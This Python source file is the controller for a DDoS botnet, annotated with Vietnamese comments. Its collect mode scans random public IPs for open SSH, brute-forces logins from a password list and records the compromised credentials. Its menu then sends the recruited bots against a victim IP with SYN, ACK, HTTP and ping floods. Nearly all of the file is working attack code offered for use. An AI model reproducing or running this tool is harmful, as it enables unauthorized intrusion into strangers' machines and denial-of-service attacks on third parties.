import paramiko
import time
import random
import socket
import struct
from ataque import load_ataque
from ataque import all_bots
from ataque import list_of_bots
from ataque import select_bot
from ataque import single_bot
from ataque import sftp
from ataque import bots_alive
from ataque import delete_list
from ataque import attack

USER=[]
PASS=[]
total_list=0

def load(option):

    global total_list

    if option==1:
        with open("passwords.txt","r") as f:
            for line in f:
                USER.append(line.split(":")[0])
                PASS.append(line.strip("\n").split(":")[1])
                total_list+=1
    # mở file password.txt và đọc từng dòng trong file để tách tên đăng nhập, mật khẩu 
    # Lưu tên đăng nhập vào danh sách USER và lưu mật khẩu vào danh sách PASS             
    if option==2:
        with open("passwords_small.txt","r") as f:
            for line in f:
                USER.append(line.split(":")[0])
                PASS.append(line.strip("\n").split(":")[1])
                total_list+=1
     #Hàm này là một hàm load dữ liệu từ file "passwords_small.txt" vào 2 list USER và PASS   



def conexion(ip, option):
    #Hàm này được sử dụng để kết nối đến các thiết bị mạng thông qua giao thức SSH bằng thư viện paramiko trong Python

    equipos=open("equipos.txt","a")
#Mở file "equipos.txt" với tùy chọn "a" (append), để ghi thông tin về các thiết bị đã được kết nối thành công vào file này.

    for i in range(total_list):
#Duyệt qua danh sách các tài khoản và mật khẩu (USER và PASS) được cung cấp, thông qua vòng lặp for với biến lặp i.
        try:
#Thử kết nối đến thiết bị mạng với địa chỉ IP là ip, sử dụng tài khoản và mật khẩu được chỉ định trong mỗi vòng lặp. 
# Nếu kết nối thành công, hàm sẽ in ra thông báo "Authentication Worked" cùng với thông tin về địa chỉ IP, tên người dùng và mật khẩu được sử dụng để kết nối. 
# Hàm cũng ghi thông tin này vào file "equipos.txt".
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

            message=ssh.connect(ip, username=USER[i], password=PASS[i])

            print(f'[*] Authentication Worked IP:{ip} USER:{USER[i]} PASS={PASS[i]}')

            equipos.write(f'{ip}:{USER[i]}:{PASS[i]}:NS\n')
            equipos.close()

            ssh.close()

            break
#Nếu xảy ra lỗi xác thực (AuthenticationException), hàm sẽ in ra thông báo "Authentication Failed" và tiếp tục thử kết nối với tài khoản và mật khẩu khác. 
#Nếu xảy ra lỗi khác (SSHException hoặc socket.error), hàm sẽ in ra thông báo tương ứng và thoát khỏi vòng lặp.
        except paramiko.ssh_exception.AuthenticationException:

            print(f'[*] Authentication Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')

        except paramiko.SSHException:

            print(f'[*] Device Failed Executing the Command IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
            break

        except socket.error:

            print(f'[*] Connection Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
            break
#Sau khi hoàn thành vòng lặp, hàm đóng file "equipos.txt" và đóng kết nối SSH.
        ssh.close()



def IP():
#để sinh ra một địa chỉ IP ngẫu nhiên và kiểm tra tính hợp lệ của địa chỉ này
    random_ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
#Sử dụng hàm random.randint trong Python để tạo ra một số nguyên ngẫu nhiên trong khoảng từ 1 đến 0xffffffff. 
#Sau đó, sử dụng hàm struct.pack để chuyển số nguyên này thành một địa chỉ IPv4 dạng chuỗi.
    sv=int(random_ip.split(".")[0])#giá trị của số đầu tiên trong địa chỉ IP
    sb=int(random_ip.split(".")[1])#giá trị của số thứ hai trong địa chỉ IP
#Lấy phần đầu tiên và phần thứ hai của địa chỉ IP này (được tách bằng dấu chấm) và kiểm tra xem nó có nằm trong các dải địa chỉ IP không hợp lệ. 
#Các dải địa chỉ này được liệt kê trong điều kiện của vòng lặp while. Nếu địa chỉ IP không hợp lệ, hàm in ra thông báo "IP not valid" và trả về giá trị False để kết thúc hàm.
    while(sv==127 or sv==0 or sv==3 or sv==15 or sv==56 or sv==10 or (sv==192 and sb==168) or (sv == 172 and sb >= 16 and sb < 32) or (sv == 100 and sb >= 64 and sb < 127) or (sv==169 and sb>254) or (sv==198 and sb>= 18 and sb<20) or sv>=224 or sv==6 or sv==7 or sv==11 or sv==21 or sv==22 or sv==26 or sv==28 or sv==29 or sv==30 or sv==33 or sv==55 or sv==214 or sv==215):
#Vòng lặp while trong đoạn mã kiểm tra tính hợp lệ của địa chỉ IP được sinh ngẫu nhiên bằng cách kiểm tra xem địa chỉ này có nằm trong các dải địa chỉ IP không hợp lệ hay không. 

        print(f'[*] IP {random_ip} not valid\n')
        return False
    print(f'[*] IP {random_ip} valid')
#Nếu địa chỉ IP hợp lệ, hàm in ra thông báo "IP valid" và trả về giá trị địa chỉ IP ngẫu nhiên đó dưới dạng chuỗi.
    return random_ip



def alive(ip):
#Hàm alive(ip) sử dụng module socket để kiểm tra xem một địa chỉ IP có mở cổng 22 (cổng SSH) hay không. 
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Khởi tạo một đối tượng socket a_socket sử dụng protocol AF_INET và type SOCK_STREAM để tạo kết nối TCP.
    location=(ip,22)
    #Gán địa chỉ IP và cổng kết nối vào biến location.
    a_socket.settimeout(0.05)
    #Đặt thời gian chờ kết nối tối đa là 0.05 giây bằng phương thức settimeout().
    result_of_check = a_socket.connect_ex(location)
    #Sử dụng phương thức connect_ex() để thử kết nối đến địa chỉ và cổng được chỉ định.
    if result_of_check == 0:
        print(f"    +---> {ip} with Port 22 is open\n")
        a_socket.close()
        return True
    else:
        print(f"    +---> {ip} with Port 22 is not open\n")
        a_socket.close()
        return False
    #Nếu kết nối thành công (mã trả về là 0), in ra thông báo và trả về giá trị True. Nếu không, in ra thông báo và trả về giá trị False.


def cls(): print("\n"*20)#in ra 20 dòng trống để làm sạch màn hình console.

def none_bots(bot):
    if bot==0:
        print("\nNot enough bots to start an attack, Press enter to exit: ")
        exit(0)
        #kiểm tra xem có đủ số lượng bot để bắt đầu tấn công hay không. 
        #Nếu không, in ra thông báo và thoát chương trình bằng lệnh exit(0).
        #Nếu có, hàm không làm gì cả.

if __name__ == '__main__':

    while 1:

        option=int(input('''

   

                    ·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
                    ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
                    ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
                    ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
                    ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
                                                                                 
           +------------------------------------------------------+
           |                                                      |
           |                   1) Bots Alive                      |
           |                                                      |
           |                   2) Bot Collect                     |
           |                                                      |
           |                   3) ACK Attack                      |
           |                                                      |
           |                   4) HTTP/HTTPS Attack               |
           |                                                      |
           |                   5) PING Attack                     |
           |                                                      |
           |                   6) SYN Attack ( Best Attack )      |                               
           |                                                      |
           |                                                      |
           +------------------------------------------------------+

Select the option: '''))

        if option==1:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            delete_list()
            input("\nPress enter to continue...")
            cls()


        if option==2:

            option=int(input('''
            1) passwords.txt ( 136 combinations, this file goes slower but it has more combos )
            2) passwords_small.txt ( 4 combinations, this file goes faster but it has less combos )

            Select the option: '''))

            load(option)

            while 1:

                    a=IP()

                    if a==False:

                        continue

                    if alive(a) == True:

                        try:

                            conexion(a,option)

                        except:

                            continue


        if option==3:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            port=str(input("Give me the victim's port: "))
            attack(ip, 3, port, "-A")
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()


        if option==4:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive the the victim's ip: ")
            attack(ip, 1, None, None)
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()


        if option==5:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            attack(ip, 2, None, None)
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        if option==6:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            port=str(input("Give me the victim's port: "))
            attack(ip, 3, port, "-S")
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        

        
